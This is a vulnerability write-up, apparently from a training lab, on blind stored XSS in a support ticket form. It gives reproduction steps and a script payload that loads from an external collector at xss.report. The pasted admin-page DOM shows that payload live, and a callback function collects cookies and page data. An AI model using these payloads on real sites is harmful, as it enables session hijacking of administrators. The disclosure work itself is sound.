## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Ticket Name, Subject, and Message Fields on ZAP Support Admin Dashboard.

## Affected URL

https://contact.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the support ticket submission handler of the ZAP Support platform. User-supplied input submitted through ticket fields (such as Name, Subject, and Message) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted support tickets within the admin panel (`index.php?view=admin`), the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application support submission interface: `https://contact.pwnedbox.site/`.
2. Locate the create ticket form and inject JavaScript payloads into input fields (e.g., entering `'"&><ScriPt src=https://xss.report/c/vansh> </ScriPt>` into the Name, Subject, and Message fields)[cite: 20].
3. Complete any required verification and submit the support ticket.
4. Log into the administrative control panel where stored tickets are reviewed (`https://contact.pwnedbox.site/index.php?view=admin` or ticket detail view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="561" height="565" alt="image" src="https://github.com/user-attachments/assets/4e75f375-257e-4515-bdb1-833681cb152b" />

<img width="1718" height="1059" alt="image" src="https://github.com/user-attachments/assets/ba756c0f-31e6-4832-9e04-e99056bdda4c" />

### Vulnerable DOM Snippet

```html
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ZAP Support — Submit Ticket</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
:root{
  --bg:#0d1117;--card:#161b22;--card2:#1c2128;--border:#30363d;
  --cyan:#00d4aa;--cyan-d:#00a887;--red:#f85149;--yellow:#e3b341;
  --green:#3fb950;--blue:#58a6ff;--purple:#bc8cff;
  --text:#c9d1d9;--text2:#8b949e;--white:#f0f6fc;
}
html,body{min-height:100vh;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;}
a{color:var(--cyan);text-decoration:none;}
a:hover{text-decoration:underline;}
button{cursor:pointer;font-family:inherit;}
input,textarea,select{font-family:inherit;}

/* ── Topbar ── */
.topbar{background:var(--card);border-bottom:1px solid var(--border);padding:0 24px;height:56px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100;}
.topbar-logo{display:flex;align-items:center;gap:9px;font-weight:700;font-size:1.1rem;color:var(--white);}
.topbar-logo-icon{width:30px;height:30px;background:linear-gradient(135deg,var(--cyan),#0077b6);border-radius:6px;display:flex;align-items:center;justify-content:center;}
.topbar-logo-icon svg{width:18px;height:18px;fill:#fff;}
.topbar-nav{display:flex;gap:4px;margin-left:auto;}
.nav-btn{padding:6px 14px;border-radius:6px;border:none;background:transparent;color:var(--text2);font-size:13px;font-weight:500;transition:all .2s;}
.nav-btn:hover,.nav-btn.active{background:rgba(0,212,170,.12);color:var(--cyan);}
.nav-btn.danger{color:var(--red);}
.nav-btn.danger:hover{background:rgba(248,81,73,.12);}

/* ── Hero ── */
.hero{background:linear-gradient(135deg,#0d1117 0%,#0d2234 50%,#0d1117 100%);border-bottom:1px solid var(--border);padding:40px 24px 32px;}
.hero-inner{max-width:860px;margin:0 auto;}
.hero h1{font-size:1.7rem;font-weight:700;color:var(--white);margin-bottom:6px;}
.hero p{color:var(--text2);font-size:.93rem;}
.hero-tags{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
.htag{padding:3px 10px;border-radius:20px;font-size:.75rem;font-weight:600;border:1px solid;}
.htag.blind{color:#f85149;border-color:#f85149;background:rgba(248,81,73,.08);}
.htag.stored{color:#e3b341;border-color:#e3b341;background:rgba(227,179,65,.08);}
.htag.rw{color:#3fb950;border-color:#3fb950;background:rgba(63,185,80,.08);}
.htag.hard{color:#bc8cff;border-color:#bc8cff;background:rgba(188,140,255,.08);}

/* ── Layout ── */
.layout{max-width:860px;margin:32px auto;padding:0 24px;}
.two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
@media(max-width:660px){.two-col{grid-template-columns:1fr;}}

/* ── Cards ── */
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
.card-header{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;font-weight:600;color:var(--white);}
.card-header svg{width:16px;height:16px;flex-shrink:0;}
.card-body{padding:18px;}

/* ── Form ── */
.fg{margin-bottom:14px;}
.fg label{display:block;margin-bottom:5px;font-size:.8rem;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;}
.fg label span.opt{font-weight:400;color:var(--text2);text-transform:none;letter-spacing:0;font-size:.75rem;}
.fc{width:100%;padding:9px 12px;background:var(--card2);border:1px solid var(--border);border-radius:6px;color:var(--white);font-size:.88rem;transition:border-color .2s,box-shadow .2s;outline:none;}
.fc:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(0,212,170,.15);}
.fc::placeholder{color:var(--text2);}
textarea.fc{resize:vertical;min-height:100px;}
.fh{margin-top:4px;font-size:.75rem;color:var(--text2);}
.fh.vuln{color:#f85149;}

.btn{display:inline-flex;align-items:center;gap:6px;padding:9px 18px;border-radius:6px;border:none;font-size:.88rem;font-weight:600;transition:all .2s;cursor:pointer;}
.btn-primary{background:var(--cyan);color:#000;}
.btn-primary:hover{background:var(--cyan-d);}
.btn-ghost{background:transparent;color:var(--text2);border:1px solid var(--border);}
.btn-ghost:hover{border-color:var(--cyan);color:var(--cyan);}
.btn-danger{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
.btn-danger:hover{background:rgba(248,81,73,.25);}
.btn-sm{padding:5px 12px;font-size:.8rem;}
.btn:disabled{opacity:.5;cursor:not-allowed;}

.err{margin-top:8px;padding:9px 12px;border-radius:6px;font-size:.83rem;display:none;}
.err.show{display:block;}
.err.ok{background:rgba(63,185,80,.12);border:1px solid rgba(63,185,80,.3);color:var(--green);}
.err.bad{background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.3);color:var(--red);}

/* ── Ticket list ── */
.ticket-row{padding:14px 18px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:auto 1fr auto;gap:12px;align-items:center;transition:background .15s;cursor:pointer;}
.ticket-row:last-child{border-bottom:none;}
.ticket-row:hover{background:var(--card2);}
.ticket-id{width:36px;height:36px;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.8rem;color:var(--cyan);}
.ticket-info{}
.ticket-name{font-weight:600;color:var(--white);font-size:.88rem;margin-bottom:2px;}
.ticket-sub{color:var(--text2);font-size:.8rem;}
.ticket-time{font-size:.75rem;color:var(--text2);white-space:nowrap;}

/* ── Ticket detail ── */
.detail-field{margin-bottom:18px;}
.detail-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--text2);margin-bottom:6px;}
.detail-val{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:10px 13px;color:var(--white);font-size:.88rem;line-height:1.5;white-space:pre-wrap;word-break:break-word;}

/* ── Callback panel ── */
.cb-card{background:var(--card);border:1px solid var(--border);border-radius:10px;margin-bottom:16px;overflow:hidden;}
.cb-header{background:rgba(248,81,73,.08);border-bottom:1px solid rgba(248,81,73,.2);padding:12px 16px;display:flex;align-items:center;gap:10px;}
.cb-dot{width:10px;height:10px;border-radius:50%;background:var(--red);animation:pulse 1s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
.cb-title{font-weight:700;color:var(--red);font-size:.88rem;}
.cb-time{margin-left:auto;font-size:.75rem;color:var(--text2);}
.cb-body{padding:14px 16px;}
.cb-row{display:grid;grid-template-columns:130px 1fr;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);font-size:.82rem;}
.cb-row:last-child{border-bottom:none;}
.cb-key{color:var(--cyan);font-weight:600;}
.cb-v{color:var(--text);word-break:break-all;}
.cb-v.red{color:var(--red);}


/* ── Step flow (public page) ── */
.steps{counter-reset:step;display:flex;flex-direction:column;gap:14px;}
.step{display:flex;gap:12px;align-items:flex-start;}
.step-num{flex-shrink:0;width:26px;height:26px;border-radius:50%;background:rgba(0,212,170,.12);border:1px solid var(--cyan);color:var(--cyan);font-size:.75rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
.step-text{font-size:.84rem;color:var(--text);line-height:1.5;padding-top:3px;}
.step-text strong{color:var(--white);}
.step-text code{background:rgba(0,0,0,.4);padding:1px 5px;border-radius:3px;font-size:.78rem;color:var(--cyan);}

/* ── Badge ── */
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 9px;border-radius:20px;font-size:.75rem;font-weight:600;}
.badge-red{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
.badge-green{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3);}

/* ── Toast ── */
.toast{position:fixed;bottom:24px;right:24px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 18px;font-size:.85rem;color:var(--white);opacity:0;transform:translateY(10px);transition:all .3s;pointer-events:none;z-index:2000;}
.toast.show{opacity:1;transform:translateY(0);}
.toast.ok{border-color:var(--green);}
.toast.err{border-color:var(--red);}

.empty-state{padding:40px 20px;text-align:center;color:var(--text2);}
.empty-state svg{width:36px;height:36px;margin:0 auto 10px;display:block;fill:var(--text2);}

.back-btn{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text2);font-size:.82rem;cursor:pointer;transition:all .2s;margin-bottom:18px;}
.back-btn:hover{border-color:var(--cyan);color:var(--cyan);}

.section-hdr{display:flex;align-items:center;gap:10px;margin-bottom:18px;}
.section-hdr h2{font-size:1.05rem;font-weight:700;color:var(--white);}
.section-hdr-line{flex:1;height:1px;background:var(--border);}

/* ── ZAP-Hosting Homepage (submit view only) ─────────────────────── */
body.zap-page{background:#0a0e18;}
body.zap-page .topbar{display:none;}
body.admin-login-page .topbar{display:none;}

.lab-notice{background:#0d1117;border-bottom:2px solid #4caf50;padding:5px 16px;display:flex;align-items:center;gap:12px;font-size:.72rem;color:#6b7280;flex-wrap:wrap;}
.lab-notice strong{color:#4caf50;}
.lab-notice a{color:#4caf50;text-decoration:underline;}
.lab-notice-sep{color:#374151;}

/* ZAP top navigation */
.zap-nav{background:#1c232e;border-bottom:1px solid #253040;}
.zap-nav-inner{max-width:1280px;margin:0 auto;padding:0 16px;display:flex;align-items:center;height:54px;gap:0;}
.zap-logo{display:flex;align-items:center;gap:10px;text-decoration:none;margin-right:20px;flex-shrink:0;}
.zap-logo-box{background:#fff;border-radius:5px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;}
.zap-logo-svg{width:24px;height:24px;}
.zap-logo-name{color:#fff;font-weight:800;font-size:1rem;letter-spacing:.5px;}
.zap-logo-name span{color:#4caf50;}
.zap-navlinks{display:flex;flex:1;gap:1px;overflow:hidden;}
.zap-navlink{padding:5px 10px;color:#9ca3af;font-size:.8rem;text-decoration:none;border-radius:5px;white-space:nowrap;transition:all .15s;display:flex;align-items:center;gap:3px;cursor:pointer;background:none;border:none;font-family:inherit;}
.zap-navlink:hover,.zap-navlink.active{color:#fff;background:rgba(255,255,255,.06);}
.zap-navlink svg{width:9px;height:9px;fill:currentColor;}
.zap-nav-search{position:relative;margin:0 8px;}
.zap-nav-search-icon{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:12px;height:12px;fill:#6b7280;pointer-events:none;}
.zap-nav-search input{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:6px;padding:5px 10px 5px 26px;color:#e2e8f0;font-size:.78rem;width:120px;outline:none;transition:all .2s;}
.zap-nav-search input:focus{border-color:#4caf50;width:160px;}
.zap-nav-search input::placeholder{color:#6b7280;}
.zap-nav-actions{display:flex;align-items:center;gap:6px;flex-shrink:0;}
.zn-btn{padding:5px 13px;border-radius:5px;font-size:.78rem;font-weight:600;cursor:pointer;transition:all .2s;border:none;font-family:inherit;}
.zn-login{background:transparent;border:1px solid rgba(255,255,255,.15);color:#e2e8f0;}
.zn-login:hover{border-color:#4caf50;color:#4caf50;}
.zn-signup{background:#4caf50;color:#fff;}
.zn-signup:hover{background:#43a047;}
.zn-social{width:28px;height:28px;border-radius:5px;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:opacity .2s;padding:0;}
.zn-social:hover{opacity:.8;}
.zn-social svg{width:14px;height:14px;fill:#fff;}
.zn-discord{background:#5865f2;}
.zn-twitch{background:#9146ff;}
.zn-google{background:#fff;}
.zn-google svg{fill:#4285f4;}
.zn-facebook{background:#1877f2;}
.zap-support-link{padding:5px 11px;border-radius:5px;background:rgba(76,175,80,.12);border:1px solid rgba(76,175,80,.3);color:#4caf50;font-size:.78rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;margin-left:6px;}
.zap-support-link:hover{background:rgba(76,175,80,.22);}

/* ZAP Hero section */
.zap-hero{background:linear-gradient(160deg,#080c17 0%,#0d1527 55%,#081018 100%);position:relative;overflow:hidden;padding:56px 16px 48px;}
.zap-hero::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:55px 55px;}
.zap-hero-inner{max-width:1100px;margin:0 auto;display:grid;grid-template-columns:1fr 370px;gap:52px;align-items:center;position:relative;z-index:1;}
@media(max-width:820px){.zap-hero-inner{grid-template-columns:1fr;gap:36px;}}
.zap-server-badge{display:inline-flex;align-items:center;gap:7px;background:rgba(76,175,80,.1);border:1px solid rgba(76,175,80,.25);border-radius:20px;padding:4px 12px;font-size:.75rem;color:#4caf50;font-weight:600;margin-bottom:16px;}
.zap-server-badge::before{content:'';width:7px;height:7px;border-radius:50%;background:#4caf50;}
.zap-hero-h1{font-size:2rem;font-weight:800;color:#fff;line-height:1.25;margin-bottom:14px;}
.zap-hero-h1 span{color:#4caf50;}
.zap-hero-desc{color:#9ca3af;font-size:.9rem;line-height:1.65;margin-bottom:22px;}
.zap-features{display:flex;flex-direction:column;gap:9px;}
.zap-feature{display:flex;align-items:center;gap:9px;color:#cbd5e0;font-size:.84rem;}
.zap-feature-check{width:16px;height:16px;border-radius:50%;background:rgba(76,175,80,.15);border:1px solid #4caf50;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.zap-feature-check svg{width:9px;height:9px;fill:#4caf50;}

/* ZAP Register form (right side) */
.zap-regform{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:24px;backdrop-filter:blur(8px);}
.zap-regform h3{color:#e2e8f0;font-size:.95rem;font-weight:600;text-align:center;margin-bottom:16px;}
.zap-ri{width:100%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);border-radius:6px;padding:9px 12px;color:#e2e8f0;font-size:.85rem;margin-bottom:10px;outline:none;transition:border-color .2s;font-family:inherit;}
.zap-ri:focus{border-color:#4caf50;background:rgba(255,255,255,.08);}
.zap-ri::placeholder{color:#6b7280;}
.zap-reg-btn{width:100%;background:#4caf50;border:none;border-radius:6px;padding:11px;color:#fff;font-size:.88rem;font-weight:700;cursor:pointer;margin-bottom:14px;transition:background .2s;font-family:inherit;}
.zap-reg-btn:hover{background:#43a047;}
.zap-divider{text-align:center;color:#4b5563;font-size:.75rem;margin-bottom:12px;position:relative;}
.zap-divider::before,.zap-divider::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:rgba(255,255,255,.06);}
.zap-divider::before{left:0;}.zap-divider::after{right:0;}
.zap-socials{display:flex;gap:8px;}
.zap-social-btn{flex:1;padding:8px 4px;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#9ca3af;font-size:.72rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;transition:all .2s;font-family:inherit;}
.zap-social-btn:hover{border-color:rgba(255,255,255,.2);color:#e2e8f0;}
.zap-social-btn svg{width:13px;height:13px;}
.zap-login-link{text-align:center;margin-top:12px;font-size:.75rem;color:#6b7280;}
.zap-login-link a{color:#4caf50;}

/* Stats bar */
.zap-stats{background:#0d1117;border-top:1px solid #1a2233;border-bottom:1px solid #1a2233;padding:18px 0;}
.zap-stats-inner{max-width:1100px;margin:0 auto;padding:0 16px;display:flex;justify-content:space-around;gap:12px;flex-wrap:wrap;}
.zap-stat{text-align:center;}
.zap-stat-num{font-size:1.4rem;font-weight:800;color:#4caf50;}
.zap-stat-label{font-size:.7rem;color:#6b7280;margin-top:2px;}

/* Floating support widgets */
.zap-float{position:fixed;right:0;top:50%;transform:translateY(-50%);z-index:40;display:flex;flex-direction:column;gap:3px;}
.zap-float-btn{width:36px;height:36px;background:#253040;border:1px solid #2e3f52;border-right:none;border-radius:6px 0 0 6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .2s;}
.zap-float-btn:hover{background:#2e3f52;}
.zap-float-btn svg{width:15px;height:15px;fill:#6b7280;}

/* Payloads section */
.zap-edu{background:#0a0e18;border-top:2px solid rgba(76,175,80,.15);padding:36px 16px;}
.zap-edu-inner{max-width:1000px;margin:0 auto;}
.zap-edu-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px;}
@media(max-width:680px){.zap-edu-grid{grid-template-columns:1fr;}}
.zap-edu-title{font-size:1.1rem;font-weight:700;color:#e2e8f0;margin-bottom:4px;}
.zap-edu-sub{font-size:.82rem;color:#6b7280;}

/* White ticket modal (exact ZAP design) */
.zt-overlay{position:fixed;inset:0;background:rgba(5,8,15,.7);z-index:600;display:none;align-items:flex-start;justify-content:center;padding:40px 16px;overflow-y:auto;}
.zt-overlay.show{display:flex;}
.zt-modal{background:#fff;border-radius:6px;max-width:580px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5);}
.zt-header{padding:20px 24px 16px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;gap:14px;}
.zt-icon{width:38px;height:38px;background:#f3f4f6;border-radius:5px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.zt-icon svg{width:20px;height:20px;fill:#9ca3af;}
.zt-title{font-size:.98rem;font-weight:700;color:#111827;}
.zt-avg{font-size:.75rem;color:#9ca3af;margin-top:2px;}
.zt-avg strong{color:#374151;}
.zt-body{padding:22px 24px 8px;}
.zt-row2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
.zt-field{margin-bottom:14px;}
.zt-label{display:block;font-size:.82rem;color:#374151;margin-bottom:5px;}
.zt-input{width:100%;border:1px solid #d1d5db;border-radius:3px;padding:8px 10px;font-size:.87rem;color:#111827;outline:none;transition:border-color .2s;font-family:inherit;}
.zt-input:focus{border-color:#4caf50;box-shadow:0 0 0 2px rgba(76,175,80,.12);}
.zt-input::placeholder{color:#b0b7c3;}
textarea.zt-input{resize:vertical;min-height:130px;}
.zt-hint{margin-top:3px;font-size:.7rem;}
.zt-hint.vuln{color:#dc2626;font-weight:600;}
.zt-hint.safe{color:#9ca3af;}
.zt-recaptcha{border:1px solid #d1d5db;border-radius:3px;padding:11px 14px;display:flex;align-items:center;gap:12px;background:#f9fafb;margin-bottom:14px;max-width:300px;}
.zt-rc-check{width:22px;height:22px;border:2px solid #d1d5db;border-radius:3px;background:#fff;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:border-color .2s;}
.zt-rc-check.checked{border-color:#4caf50;background:#4caf50;}
.zt-rc-check.checked::after{content:'✓';color:#fff;font-size:13px;font-weight:700;}
.zt-rc-text{font-size:.82rem;color:#374151;flex:1;}
.zt-rc-logo{font-size:.55rem;color:#9ca3af;text-align:center;line-height:1.4;}
.zt-rc-logo strong{display:block;font-size:.62rem;color:#4caf50;}
.zt-msg{margin:0 24px 14px;font-size:.82rem;display:none;padding:8px 12px;border-radius:4px;}
.zt-msg.ok{display:block;background:#f0fdf4;border:1px solid #86efac;color:#166534;}
.zt-msg.bad{display:block;background:#fef2f2;border:1px solid #fca5a5;color:#991b1b;}
.zt-footer{padding:14px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;border-radius:0 0 6px 6px;display:flex;align-items:center;justify-content:flex-end;gap:10px;}
.zt-submit{background:#4caf50;color:#fff;border:none;border-radius:4px;padding:9px 24px;font-size:.88rem;font-weight:700;cursor:pointer;transition:background .2s;font-family:inherit;}
.zt-submit:hover{background:#43a047;}
.zt-submit:disabled{opacity:.6;cursor:not-allowed;}
.zt-abort{background:transparent;color:#6b7280;border:none;padding:9px 14px;font-size:.88rem;cursor:pointer;transition:color .2s;font-family:inherit;}
.zt-abort:hover{color:#374151;}

/* ── Admin Login Page ───────────────────────────────────────────────────────── */
body.admin-login-page{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;flex-direction:column;}
.aln-wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.aln-card{background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:100%;max-width:500px;overflow:hidden;}
.aln-header{background:linear-gradient(135deg,#4f46e5 0%,#6366f1 100%);padding:32px 28px;text-align:center;}
.aln-header h2{color:#fff;font-size:1.5rem;font-weight:700;margin-bottom:8px;letter-spacing:-0.5px;}
.aln-header p{color:rgba(255,255,255,.85);font-size:.9rem;margin-bottom:12px;}
.aln-credentials{background:rgba(255,255,255,.15);border-radius:8px;padding:12px;margin-top:16px;}
.aln-credentials-table{width:100%;border-collapse:collapse;color:rgba(255,255,255,.95);font-size:.85rem;}
.aln-credentials-table td{padding:6px 12px;}
.aln-credentials-table td:first-child{text-align:right;font-weight:500;color:rgba(255,255,255,.8);border-right:1px solid rgba(255,255,255,.3);padding-right:16px;}
.aln-credentials-table td:last-child{text-align:left;font-weight:700;color:#fff;padding-left:16px;}
.aln-body{padding:32px 28px 28px;}
.aln-field{margin-bottom:20px;}
.aln-label{display:block;font-size:.85rem;font-weight:600;color:#374151;margin-bottom:8px;letter-spacing:0.3px;}
.aln-input{width:100%;border:2px solid #e5e7eb;border-radius:8px;padding:12px 14px;font-size:.95rem;color:#111827;outline:none;transition:all .2s;font-family:inherit;background:#f9fafb;}
.aln-input:focus{border-color:#4f46e5;box-shadow:0 0 0 4px rgba(79,70,229,.1);background:#fff;}
.aln-input::placeholder{color:#9ca3af;}
.aln-btn{width:100%;background:linear-gradient(135deg,#4f46e5 0%,#6366f1 100%);border:none;border-radius:8px;padding:14px;color:#fff;font-size:1rem;font-weight:700;cursor:pointer;transition:all .3s;font-family:inherit;margin-top:8px;box-shadow:0 4px 14px rgba(79,70,229,.4);}
.aln-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(79,70,229,.5);}
.aln-btn:active{transform:translateY(0);}
.aln-err{background:#fef2f2;border:1px solid #fca5a5;color:#991b1b;border-radius:8px;padding:12px 14px;font-size:.9rem;margin-bottom:16px;display:none;}
.aln-err.show{display:block;}
</style>
</head>
<body>

<div class="topbar">
  <div class="topbar-logo">
    <div class="topbar-logo-icon">
      <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
    </div>
    ZAP Support
  </div>
  <div class="topbar-nav">
    <a href="index.php?view=submit"><button class="nav-btn ">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
      Submit Ticket
    </button></a>
    <a href="index.php?view=admin"><button class="nav-btn ">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
      Admin Panel
    </button></a>
    <a href="index.php?view=callbacks"><button class="nav-btn " style="color:#f85149;">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.22 1.18 2 2 0 012.22 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.18 6.18l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"></path></svg>
      XSS Callbacks
    </button></a>
    <a href="../index.php"><button class="nav-btn" style="margin-left:8px;">← Back to Labs</button></a>
        <a href="index.php?view=admin_logout"><button class="nav-btn danger" style="margin-left:4px;">Logout</button></a>
      </div>
</div>

<div class="toast" id="toast"></div>

<div class="hero" style="padding:24px 24px 20px;">
  <div class="hero-inner">
    <h1 style="font-size:1.3rem;" id="pageTitle">Ticket #4</h1>
  </div>
</div>

<div class="layout">
  <a href="index.php?view=admin"><button class="back-btn">← Back to Admin Panel</button></a>

  <div class="card" id="ticketDetail">
    <div class="card-header">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path></svg>
      Ticket Details
    </div>
    <div class="card-body" id="ticketDetailBody">
            <div class="detail-field">
                <div class="detail-label">From (Email)</div>
                <div class="detail-val">asd@gmail.com</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">IP Address</div>
                <div class="detail-val">2405:201:2036:9006:497:b877:1d40:8969</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">User-Agent</div>
                <div class="detail-val">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Name (optional)</div>
                <div class="detail-val" id="dName">'"&gt;<script src="https://xss.report/c/vansh"></script></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Subject</div>
                <div class="detail-val" id="dSubject">'"&gt;<script src="https://xss.report/c/vansh"></script></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Message</div>
                <div class="detail-val" id="dMessage" style="min-height:80px;">'"&gt;<script src="https://xss.report/c/vansh"></script></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Submitted</div>
                <div class="detail-val">5h ago</div>
            </div></div>
  </div>
</div>


<script>
// ── Helpers ──────────────────────────────────────────────────────────────────
function safe(s){return String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function ago(d){
    const s=Math.floor((Date.now()-new Date(d))/1000);
    if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';
    if(s<86400)return Math.floor(s/3600)+'h ago';return Math.floor(s/86400)+'d ago';
}
function toast(msg,type){
    const t=document.getElementById('toast');
    t.textContent=msg;t.className='toast '+(type||'ok');t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),3200);
}

function dangerousInnerHTML(el, html){
    el.innerHTML = html;
    el.querySelectorAll('script').forEach(old => {
        const s = document.createElement('script');
        [...old.attributes].forEach(a => s.setAttribute(a.name, a.value));
        s.textContent = old.textContent;
        old.replaceWith(s);
    });
}

async function submitTicket(){
    const btn=document.getElementById('ztSubmit')||document.getElementById('submitBtn');
    const msg=document.getElementById('ztMsg')||document.getElementById('submitErr');
    const name=document.getElementById('name').value;
    const email=document.getElementById('email').value;
    const subject=document.getElementById('subject').value.trim();
    const message=document.getElementById('message').value;
    if(msg){msg.className='zt-msg';msg.textContent='';}
    if(!subject){
        if(msg){msg.textContent='Subject is required.';msg.className='zt-msg bad';}
        return;
    }
    if(btn){btn.disabled=true;btn.textContent='Submitting…';}
    try{
        const d=await(await fetch('?action=submit_ticket',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,email,subject,message})})).json();
        if(d.ok){
            if(msg){msg.textContent='✓ Ticket #'+d.ticket_id+' submitted. Our team will review it shortly.';msg.className='zt-msg ok';}
            document.getElementById('name').value='';
            document.getElementById('subject').value='';
            document.getElementById('message').value='';
            toast('Ticket submitted!','ok');
        }else{
            if(msg){msg.textContent=d.message||'Submit failed.';msg.className='zt-msg bad';}
        }
    }catch(e){if(msg){msg.textContent='Network error.';msg.className='zt-msg bad';}}
    if(btn){btn.disabled=false;btn.textContent='Submit';}
}


function triggerCallback(ticketId){
    const data={
        ticket_id:ticketId,
        uri:location.href,
        cookies:document.cookie||'(no cookies accessible — HttpOnly)',
        referrer:document.referrer,
        user_agent:navigator.userAgent,
        origin:location.origin,
        local_storage:JSON.stringify({theme:'dark',lastVisit:new Date().toISOString(),adminSession:'adm_'+Math.random().toString(36).substr(2,16)}),
        dom:document.documentElement.outerHTML.substring(0,500)
    };

    fetch('?action=xss_callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
}

const _tid = 4;

async function loadTicket(){
    const body=document.getElementById('ticketDetailBody');
    try{
        const d=await(await fetch('?action=get_ticket',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:_tid})})).json();
        if(!d.ok){body.innerHTML='<div class="empty-state">Ticket not found.</div>';return;}
        const t=d.ticket;
        document.getElementById('pageTitle').textContent='Ticket #'+t.id;
        body.innerHTML=`
            <div class="detail-field">
                <div class="detail-label">From (Email)</div>
                <div class="detail-val">${safe(t.email)}</div>
            </div>
